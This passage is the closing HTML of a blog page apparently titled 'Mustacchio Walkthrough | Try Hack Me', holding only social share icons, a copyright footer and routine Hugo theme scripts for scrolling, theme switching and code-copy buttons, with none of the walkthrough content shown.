37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Mustacchio Walkthrough | Try Hack Me | Ally¬†Petitt on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fally-petitt.github.io%3a443%2fen%2fposts%2f2022-02-18_mustacchio-walkthrough---try-hack-me---ally-petitt-6295dfbbfb1b%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Mustacchio Walkthrough | Try Hack Me | Ally¬†Petitt on whatsapp" href="https://api.whatsapp.com/send?text=Mustacchio%20Walkthrough%20%7c%20Try%20Hack%20Me%20%7c%20Ally%c2%a0Petitt%20-%20https%3a%2f%2fally-petitt.github.io%3a443%2fen%2fposts%2f2022-02-18_mustacchio-walkthrough---try-hack-me---ally-petitt-6295dfbbfb1b%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Mustacchio Walkthrough | Try Hack Me | Ally¬†Petitt on telegram" href="https://telegram.me/share/url?text=Mustacchio%20Walkthrough%20%7c%20Try%20Hack%20Me%20%7c%20Ally%c2%a0Petitt&amp;url=https%3a%2f%2fally-petitt.github.io%3a443%2fen%2fposts%2f2022-02-18_mustacchio-walkthrough---try-hack-me---ally-petitt-6295dfbbfb1b%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Mustacchio Walkthrough | Try Hack Me | Ally¬†Petitt on ycombinator" href="https://news.ycombinator.com/submitlink?t=Mustacchio%20Walkthrough%20%7c%20Try%20Hack%20Me%20%7c%20Ally%c2%a0Petitt&u=https%3a%2f%2fally-petitt.github.io%3a443%2fen%2fposts%2f2022-02-18_mustacchio-walkthrough---try-hack-me---ally-petitt-6295dfbbfb1b%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentcolor" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://ally-petitt.github.io:443/en/>Ally Petitt</a></span> ¬∑
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>